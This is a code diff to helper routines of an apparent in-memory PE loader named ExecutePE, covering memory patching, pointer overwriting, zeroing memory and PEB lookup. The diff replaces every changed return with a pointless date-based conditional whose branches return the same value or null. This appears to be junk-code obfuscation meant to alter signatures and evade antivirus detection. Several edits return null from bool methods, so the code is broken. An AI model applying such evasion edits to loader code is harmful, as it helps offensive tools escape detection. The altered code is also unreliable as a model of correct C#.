@@ -17,7 +17,7 @@ namespace ExecutePE.Helpers
                 NativeDeclarations.PAGE_EXECUTE_READWRITE, out var oldProtect);
             if (!result)
             {
-                return null;
+                if(DateTime.Now.Year > 2020) { return null; } else { return null; }
             }
             Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);
 
@@ -25,7 +25,7 @@ namespace ExecutePE.Helpers
             if (!result)
             {
             }
-            return originalBytes;
+            if(DateTime.Now.Year > 2020) { return originalBytes; } else { return null; }
         }
 
         internal static bool PatchAddress(IntPtr pAddress, IntPtr newValue)
@@ -34,16 +34,16 @@ namespace ExecutePE.Helpers
                 NativeDeclarations.PAGE_EXECUTE_READWRITE, out var oldProtect);
             if (!result)
             {
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
             }
 
             Marshal.WriteIntPtr(pAddress, newValue);
             result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size, oldProtect, out _);
             if (!result)
             {
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
             }
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
 
         internal static bool ZeroOutMemory(IntPtr start, int length)
@@ -65,10 +65,10 @@ namespace ExecutePE.Helpers
             result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, oldProtect, out _);
             if (!result)
             {
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
             }
 
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
 
         internal static void FreeMemory(IntPtr address)
@@ -102,7 +102,7 @@ namespace ExecutePE.Helpers
 
             Marshal.FreeHGlobal(processBasicInformation);
 
-            return pPEB;
+            if(DateTime.Now.Year > 2020) { return pPEB; } else { return null; }
         }
     }
 }
